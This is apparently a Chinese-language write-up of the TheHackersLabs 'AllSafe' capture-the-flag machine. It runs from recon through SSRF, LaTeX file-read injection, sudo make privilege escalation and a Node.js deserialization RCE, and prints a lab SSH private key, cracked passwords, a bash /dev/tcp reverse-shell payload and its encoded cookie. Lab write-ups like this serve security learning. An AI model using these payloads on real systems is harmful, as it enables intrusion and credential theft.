# 1. **信息收集阶段**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l         
...
192.168.205.136 08:00:27:e0:05:50       (Unknown)
...
```

发现目标主机 192.168.205.136

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p0-65535 192.168.205.136         
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
 
┌──(kali㉿kali)-[~]
└─$ nmap -p2222 -sC -sV 192.168.205.136                                   
...
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
```

开放端口：22(SSH), 80(HTTP), 2222(SSH)

# 2. **域名发现**

![image-20251019113144223](http://7r1UMPHK.github.io/image/20251019145556227.webp)

源码中发现域名 http://allsafe.thl/

添加hosts并爆破子域名

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts             

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts                         
192.168.205.136 allsafe.thl
                        
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u "http://allsafe.thl" -H "HOST:FUZZ.allsafe.thl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 560
...
000000058:   302      0 L     0 W        0 Ch        "intranet - intranet"   
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts
192.168.205.136 allsafe.thl intranet.allsafe.thl
```

发现子域：`intranet.allsafe.thl`

![image-20251019113617538](http://7r1UMPHK.github.io/image/20251019145556489.webp)

需要一个id和密码，去主域看看

# 3. **目录扫描**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -q -u 192.168.205.136        
...
[11:30:06] 200 -  477B  - http://192.168.205.136/assets/
[11:30:06] 301 -  319B  - http://192.168.205.136/assets  ->  http://192.168.205.136/assets/
[11:30:07] 200 -    1KB - http://192.168.205.136/contact.php
[11:30:08] 301 -  319B  - http://192.168.205.136/images  ->  http://192.168.205.136/images/
[11:30:08] 200 -  684B  - http://192.168.205.136/images/
[11:30:11] 403 -  280B  - http://192.168.205.136/server-status
[11:30:11] 403 -  280B  - http://192.168.205.136/server-status/
[11:30:13] 301 -  318B  - http://192.168.205.136/views  ->  http://192.168.205.136/views/
```

![image-20251019113726312](http://7r1UMPHK.github.io/image/20251019145553712.webp)

在`our-team.php`找到员工ID：04779990

`contact.php`经过测试没有xxs,sql之类的

扒拉一下intranet

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -q -u http://intranet.allsafe.thl 
...
[11:40:56] 200 -  485B  - http://intranet.allsafe.thl/assets/
[11:40:56] 301 -  329B  - http://intranet.allsafe.thl/assets  ->  http://intranet.allsafe.thl/assets/
[11:40:58] 200 -    0B  - http://intranet.allsafe.thl/db.php
[11:40:58] 301 -  327B  - http://intranet.allsafe.thl/docs  ->  http://intranet.allsafe.thl/docs/
[11:40:58] 200 -  405B  - http://intranet.allsafe.thl/docs/
[11:40:59] 301 -  329B  - http://intranet.allsafe.thl/images  ->  http://intranet.allsafe.thl/images/
[11:40:59] 200 -  455B  - http://intranet.allsafe.thl/images/
[11:41:00] 200 -    1KB - http://intranet.allsafe.thl/login.php
[11:41:02] 200 -  967B  - http://intranet.allsafe.thl/profile.php
[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status
[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status/
[11:41:04] 301 -  328B  - http://intranet.allsafe.thl/views  ->  http://intranet.allsafe.thl/views/
```

`profile.php`没啥有价值的

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://intranet.allsafe.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 2075]
/profile.php          (Status: 200) [Size: 2305]
/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]
/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]
/customers.php        (Status: 200) [Size: 11072]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]
/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]
```

`customers.php`发现大量用户信息，但是没有密码

在`/process`目录下发现大量疑似生成文件夹

![image-20251019114437353](http://7r1UMPHK.github.io/image/20251019145555722.webp)

通过查看，发现是都是“服务合同”PDF的 LaTeX 生成文件

![image-20251019114529533](http://7r1UMPHK.github.io/image/20251019145705736.webp)

并且通过查看`document.tex`，发现可以读取敏感信息

![image-20251019114642753](http://7r1UMPHK.github.io/image/20251019145557800.webp)

查看了全部的pdf，都是passwd文件或者id_rsa文件，id_rsa文件都是失效的，通过passwd收获两个用户名`goddard` 和`parker`

结合目前的信息来看，需要先进入intranet子域的系统，继续信息收集

收集了好一会，搁置了几天，因为实在找不到，后面我看到有人写wp了，瞄瞄

# 4. **SSRF漏洞利用**

*ps:https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md*

![image-20251019115444746](http://7r1UMPHK.github.io/image/20251019145600866.webp)

c，我试过了127.0.0.1不行，我还以为没有呢

拿到一个密码`123456Seven`

尝试登录

然后这里有一个问题，我的火狐浏览器访问http://intranet.allsafe.thl/login.php会出不来，但是google浏览器可以，所以自己解决一下这个问题吧

```
0-477-9990
123456Seven
```

登录成功

![image-20251019115848173](http://7r1UMPHK.github.io/image/20251019145604630.webp)

加载的也不是很完整，不管了能用就行

# 5. **LaTeX注入读取SSH密钥**

我们已知Empresa字段可以通过`\lstinputlisting{/etc/passwd}`读取文件，我们尝试读取那两个用户的ssh私钥

![image-20251019121327471](http://7r1UMPHK.github.io/image/20251019145711830.webp)

然后生成了，死活不出东西，我去看process的生成文件，发现

![image-20251019121410361](http://7r1UMPHK.github.io/image/20251019145609790.webp)

![image-20251019121428663](http://7r1UMPHK.github.io/image/20251019145613131.webp)

他前端搞反了，我们也调整一下

![image-20251019120804269](http://7r1UMPHK.github.io/image/20251019145614798.webp)

parker的也类似

![image-20251019120956589](http://7r1UMPHK.github.io/image/20251019145620203.webp)

parker的私钥出货了

![image-20251019121518491](http://7r1UMPHK.github.io/image/20251019145622259.webp)

直接复制出来的是有问题的，我们慢慢处理一下

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ vim /tmp/id_rsa 
                                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat /tmp/id_rsa | sed '1b; $b; s/ //g' > /tmp/id_rsa1
                                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ chmod 600 /tmp/id_rsa1                               
                                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh-keygen -y -f /tmp/id_rsa1   
Load key "/tmp/id_rsa1": error in libcrypto
                                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat -A /tmp/id_rsa1
M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RBEGIN OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$
...
M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^REND OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$
```

头尾问题，去复制一个标准的就好了

完美的id_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAmGqHh2o84MpOxktbDf6ENwqdz7xQ4XqZbut/nxIfpevyszfP0kOM
edI2pX+vZVVTzxJ3GumZYArNWeFScOI90ZCU8bylIihC0i/450XzzN86SgNkOeFIjK5uiU
78ATZwuJVqRNspyAg4qpohBt43SiJ2ILL75u5lPBzFX9rfeW9kpxU+nuR6P/wTpcqFgZWT
TuSwfEudYAmBOtG01hrfgtVZzBZ8eqNCjIZmx7HQkeny+sOMdTwkKp8PuBqMyag4E/PYFR
HF7MunDmbvh0V163FatZYQippXsr3iTt7NT0qOxqNk+kvvWWbbRGBN9VHDByyNC20Hj7W0
RALgwYDmrwAAA8gz5lrPM+ZazwAAAAdzc2gtcnNhAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp
3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUi
KELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HM
Vf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR
6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2
T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOavAAAAAwEAAQAAAQA7FUi2YKN6zFHfIoUI
lrowEAh+59Q+o+Toj5foVQE5s45glOkV7CN/cdLHMwkN8hbL9a+AGj/fcDCMgAESS1GFdF
OYpfUpmYvVqM0G8iIBMCOLX2cx3Lff+RpWVezwl2b41srcKE05Ap7c22SkIe4y6cr7AAcQ
TSenNsv4TYNFsiRzVDUwISqlp3EhFWPe1GClasPahS3pEDcNiMwRh8mPt7HRG9HqLEPhWv
9qTpoCnnc30s4Wo9QipdtcxvHrrEPVVrwcz3SJnlCLTlYjiBHZ+gGBl73crSZJOlxNAiow
A85FBKi6FrWaA3WXrKdCFEh3atKGg5I8kCGhxBkpjn8ZAAAAgCo8745ADp4U7gibCuKs5N
g7JYWuJDZCYyEClHkWJYdb6CluTJx9DOw0i28Ip8FM8P0YQclTMlU21pwVj1eVXk/5D3kg
bsBO4hfcSoqewOG0H5U44aiey01z38kz0PL6Z/6JGMzEuSvlHKTJgCGaQSrFcC1X/57LOp
pViYAqrNC5AAAAgQDPNORYZS8OywkcFN2LZe3uHa4EFZPytnzcPcnQeGWwVqm/12D10vPR
yeTA0lvIKYkWcClPmiM3/CFQdWPwTyMGryyMv+5+lVJEi0dfHa02jCYKH87pVH35UF6ZPB
TgvhsrQRFX12vSk/DO30Aa15P/GT4XceHEdM6GlXkOBtILjQAAAIEAvE6vGGynNroa34mv
cuLE4hu5zK8t167MUX6zNgPDmmoUTwHIRL43ErUo+KpQf1yS3S70Q6xfTQjaxo9S5QuQMR
CsEojTarhvJ7+VxSKpjjju9Nmuxd2d2vrEPTgrOSijimjkjWK6OhZgemGoKoDUpOf2j8kv
mKzxF43kdEiETisAAAARcm9vdEAwOTk2MGRmYjE3OGUBAg==
-----END OPENSSH PRIVATE KEY-----
```

# 6. **SSH登录与横向移动**

尝试利用

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ vim /tmp/id_rsa
                       
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ chmod 600 /tmp/id_rsa 
                                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh-keygen -y -f /tmp/id_rsa 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUiKELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HMVf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOav root@09960dfb178e
                               
┌──(kali㉿kali)-[/tmp]
└─$ ssh parker@192.168.205.136  -i /tmp/id_rsa1
parker@192.168.205.136's password: 

┌──(kali㉿kali)-[/tmp]
└─$ ssh parker@192.168.205.136 -p 2222 -i /tmp/id_rsa1
parker@153504fd9bcb:~$ id
uid=1001(parker) gid=1001(parker) groups=1001(parker)
```

横向移动

```bash
parker@153504fd9bcb:~$ cd
parker@153504fd9bcb:~$ ls -al
total 24
drwx---r-x 1 parker parker 4096 Aug 24 18:39 .
drwxr-xr-x 1 root   root   4096 Aug 24 18:39 ..
-rw-r--r-- 1 parker parker  220 Jul 30 19:28 .bash_logout
-rw-r--r-- 1 parker parker 3526 Jul 30 19:28 .bashrc
-rw-r--r-- 1 parker parker  807 Jul 30 19:28 .profile
drwxr-xr-x 1 parker parker 4096 Aug 24 18:39 .ssh
parker@153504fd9bcb:~$ cd /home/
parker@153504fd9bcb:/home$ ls -al
total 16
drwxr-xr-x 1 root    root    4096 Aug 24 18:39 .
drwxr-xr-x 1 root    root    4096 Oct 11 18:41 ..
drwx------ 2 goddard goddard 4096 Aug 24 18:39 goddard
drwx---r-x 1 parker  parker  4096 Aug 24 18:39 parker
parker@153504fd9bcb:/home$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null
/home/parker
/home/parker/.ssh
/home/parker/.ssh/id_rsa.pub
/home/parker/.ssh/id_rsa
/home/parker/.ssh/authorized_keys
/home/parker/.bash_logout
/home/parker/.bashrc
/home/parker/.profile
/dev/pts/0
/var/mail/parker
/var/mail/parker/meeting
parker@153504fd9bcb:/home$ cd /var/mail/parker
parker@153504fd9bcb:/var/mail/parker$ ls -la
total 12
drwxr-sr-x 2 parker parker 4096 Aug 24 18:39 .
drwxrwsr-x 1 root   mail   4096 Aug 24 18:39 ..
-rw-r--r-- 1 parker parker  898 Aug 24 18:39 meeting
parker@153504fd9bcb:/var/mail/parker$ cat meeting
From goddard@localhost Thu Aug 21 14:05:20 2025
Date: Thu, 21 Aug 2025 14:05:20 +0000
From: goddard@localhost
To: parker@localhost
Subject: Reunión con E-Corp
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hola Oliver,

Te adjunto las notas que armé para la reunión con el cliente.  
Revisalo y confirmame si llegamos con todo.

Saludos,  
Gideon

--BOUNDARY
Content-Type: text/plain; name="meeting_notes.txt"
Content-Disposition: attachment; filename="meeting_notes.txt"
Content-Transfer-Encoding: 7bit

Meeting Notes - E-Corp
----------------------
1. Confirmar agenda con el cliente.
2. Revisar documentación técnica.
3. Validar acceso al portal con la credencial:

   Clave de acceso: 6D7033386E71556654416130494D314F70306157

4. Preparar demo corta del servicio.
--BOUNDARY--
EOF.          
```

利用https://gchq.github.io/CyberChef/ hex解出`mp38nqUfTAa0IM1Op0aW`

# 7. **容器内提权**

```bash
parker@153504fd9bcb:/home$ su goddard
Password: 
goddard@153504fd9bcb:/home$ id
uid=1000(goddard) gid=1000(goddard) groups=1000(goddard)
goddard@153504fd9bcb:/home$ sudo -l
Matching Defaults entries for goddard on 153504fd9bcb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User goddard may run the following commands on 153504fd9bcb:
    (ALL) NOPASSWD: /usr/bin/make
```

*ps:https://gtfobins.github.io/gtfobins/make/#sudo*

```bash
goddard@153504fd9bcb:/home$ sudo make -s --eval=$'x:\n\t-'"/bin/bash"
root@153504fd9bcb:/home# id
uid=0(root) gid=0(root) groups=0(root)
root@153504fd9bcb:/home# cd
root@153504fd9bcb:~# ls -al
total 24
drwx------ 1 root root 4096 Aug 24 18:39 .
drwxr-xr-x 1 root root 4096 Oct 11 18:41 ..
-rw-r--r-- 1 root root  607 May 12 19:25 .bashrc
-rw-r--r-- 1 root root  132 May 12 19:25 .profile
drwx------ 2 root root 4096 Aug 24 18:38 .ssh
-rw-r--r-- 1 root root 1656 Aug 22 16:02 secrets.psafe3
```

传去kali

```bash
root@153504fd9bcb:~# scp secrets.psafe3 kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
...
secrets.psafe3                               100% 1656   749.5KB/s   00:00 
```

pwsafe查看

![image-20251019125219858](http://7r1UMPHK.github.io/image/20251019145628481.webp)

要密码，爆破一下

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ pwsafe2john secrets.psafe3 > hash
                                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
rockandroll      (secret)     
...
```

![image-20251019125504831](http://7r1UMPHK.github.io/image/20251019145630284.webp)

获得cisco密码：`sMpam!dE#8@$$1P%bnV@fFxdqjFFG#`

登录

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh cisco@192.168.205.136
cisco@192.168.205.136's password: 
Linux allsafe 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
 █████╗ ██╗     ██╗     ███████╗ █████╗ ███████╗███████╗
██╔══██╗██║     ██║     ██╔════╝██╔══██╗██╔════╝██╔════╝
███████║██║     ██║     ███████╗███████║█████╗  █████╗  
██╔══██║██║     ██║     ╚════██║██╔══██║██╔══╝  ██╔══╝  
██║  ██║███████╗███████╗███████║██║  ██║██║     ███████╗
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝
Last login: Fri Aug 22 23:59:20 2025 from 192.168.1.19
cisco@allsafe:~$ id
uid=1002(cisco) gid=1002(cisco) grupos=1002(cisco)
cisco@allsafe:~$ sudo -l
sudo: unable to resolve host allsafe: Nombre o servicio desconocido
[sudo] contraseña para cisco: 
Sorry, user cisco may not run sudo on allsafe.
cisco@allsafe:~$ ls -al
total 32
drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 .
drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt
cisco@allsafe:~$ cat user.txt
e8c459b5b46f5722effe5f2f64421ef3
cisco@allsafe:~$ strings darkarmy.bin
70617373776f72643d64726b32303235210a
```

CyberChef看了一下，还是hex，解除`password=drk2025!`

密码都不对，骗人的

```bash
cisco@allsafe:~$ ss -tulnp        
...
tcp              LISTEN             0                  511                                127.0.0.1:3000                               0.0.0.0:*     ...                             
cisco@allsafe:~$ ls- al
-bash: ls-: orden no encontrada
cisco@allsafe:~$ ls -al
total 32
drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 .
drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt
cisco@allsafe:~$ cat .unknown
Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
A partir de ahora, todo contacto será únicamente a través del canal seguro.

Conéctate al servidor de mensajería y entra en la sala:
    dark-ops

No intentes usar este acceso para nada más que lo acordado.  
Nosotros decidimos cuándo y cómo se conversa.
```

经过查看，端口3000是基于 Socket.IO 的聊天应用，我们转发出去

# 8. **端口转发与日志分析**

```bash
cisco@allsafe:~$ busybox wget 192.168.205.128/socat
Connecting to 192.168.205.128 (192.168.205.128:80)
saving to 'socat'
socat                100% |**********************************************************************************************************************************| 4724k  0:00:00 ETA
'socat' saved
cisco@allsafe:~$ chmod +x socat
cisco@allsafe:~$ ./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 &
[1] 2001
```

没问题，可以访问

![image-20251019130446534](http://7r1UMPHK.github.io/image/20251019145634052.webp)

测试我们刚刚拿到了信息

```
Gideon
dark-ops
6D7033386E71556654416130494D314F70306157
```

不行，那就是还有东西我们没找到
扒拉了一个查看修改时间的软件，发现了这个

```bash
/var/log/app.log         2025-08-22   -rwxr-xr-x         1654
```

我们可读

```bash
cisco@allsafe:/tmp$ cat /var/log/app.log
2025-08-21T12:01:11.233Z [INFO] Server started on port 3000 (PID 2234)
2025-08-21T12:01:11.235Z [DEBUG] Connected to MySQL at mysql-db:3306
2025-08-21T12:01:12.004Z [WARN] DeprecationWarning: uuid.v1() is deprecated. Use uuid.v4()
2025-08-21T12:01:13.551Z [INFO] GET /healthcheck 200 - 2ms
2025-08-21T12:01:14.232Z [INFO] GET /favicon.ico 404 - 3ms
2025-08-21T12:01:19.998Z [DEBUG] Cache miss for key: session:oparker
2025-08-21T12:01:20.012Z [INFO] POST /login 401 - 45ms - user=oparker
2025-08-21T12:01:20.014Z [ERROR] Invalid credentials for user=oparker ip=10.0.0.12

2025-08-21T12:01:35.783Z [INFO] POST /auth 401 - 62ms - user=shadow
2025-08-21T12:01:35.784Z [DEBUG] Authentication failed for user shadow using password=123456
2025-08-21T12:01:36.001Z [WARN] Too many failed attempts for user=shadow from 10.0.0.55

2025-08-21T12:01:40.152Z [INFO] POST /auth 200 - 38ms - user=cisco
2025-08-21T12:01:40.153Z [DEBUG] Authentication success: password=DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
2025-08-21T12:01:40.155Z [INFO] Joined secure channel: dark-ops

2025-08-21T12:01:41.998Z [DEBUG] Socket.io message from user=shadow: "system ready"
2025-08-21T12:01:42.112Z [INFO] GET /api/clients 200 - 14ms
2025-08-21T12:01:43.550Z [ERROR] UnhandledPromiseRejectionWarning: TypeError: Cannot read property 'id' of undefined
2025-08-21T12:01:43.551Z [INFO] Trace: at /srv/app/routes.js:77:19
2025-08-21T12:01:44.992Z [DEBUG] Cache hit for key: client:ecorp
2025-08-21T12:01:45.011Z [INFO] POST /reports/upload 500 - 132ms - user=parker
2025-08-21T12:01:45.012Z [ERROR] Error: File too large (>5MB)
2025-08-21T12:01:46.200Z [DEBUG] Session destroyed for user=oparker
```

分析/var/log/app.log获得认证信息

```
cisco
dark-ops
DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
```

登录成功，我去中文？！

![image-20251019130950990](http://7r1UMPHK.github.io/image/20251019145636883.webp)

没啥东西，测试了ssti之类的也没啥东西

抓个包看看

```bash
GET / HTTP/1.1
Host: 192.168.205.136:3001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: sess=eyJ1c2VybmFtZSI6ImNpc2NvIn0%3D
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 20 Aug 2025 13:34:08 GMT
If-None-Match: W/"3ce-198c7afdc80"
Priority: u=0, i
```

Cookie这个jwt也太短了吧

![image-20251019131355893](http://7r1UMPHK.github.io/image/20251019145639751.webp)

啊这，伪造也没啥价值

问了波ai，说可能是 **Node.js反序列化漏洞**

# **9. Node.js反序列化RCE**

```json
{
  "username": "_$$ND_FUNC$$_function(){require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'\");}()"
}
```

base编码+url编码

```
ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D
```

kali监听

关键利用包，替换到 Socket.IO 轮询请求

```
POST /socket.io/?EIO=4&transport=polling&t=a7m0hv65&sid=Zr2kizcum7IVICx8AAAc HTTP/1.1
Host: 192.168.205.136:3001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-type: text/plain;charset=UTF-8
Content-Length: 49
Origin: http://192.168.205.136:3001
Connection: keep-alive
Cookie: sess=ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D

40{"username":"anon","room":"general","token":""}
```

监听并获取反弹 shell：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                                                                                                                                                                
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.136] 41224
bash: no se puede establecer el grupo de proceso de terminal (377): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@allsafe:~/app/src# id
id
uid=0(root) gid=0(root) grupos=0(root)
root@allsafe:~/app/src# cd  
cd
root@allsafe:~# cat /root/root.txt   
cat /root/root.txt
74d1b217518f030ed2c911f77413f394
root@allsafe:~# find / -name 'user.txt' 2>/dev/null
find / -name 'user.txt' 2>/dev/null
/home/cisco/user.txt
root@allsafe:~# cat /home/cisco/user.txt
cat /home/cisco/user.txt
e8c459b5b46f5722effe5f2f64421ef3
```

# 10. 聊聊

thehackerslabs的强度又起来了，好事

它的网址是：https://labs.thehackerslabs.com/ 

想打的可以打打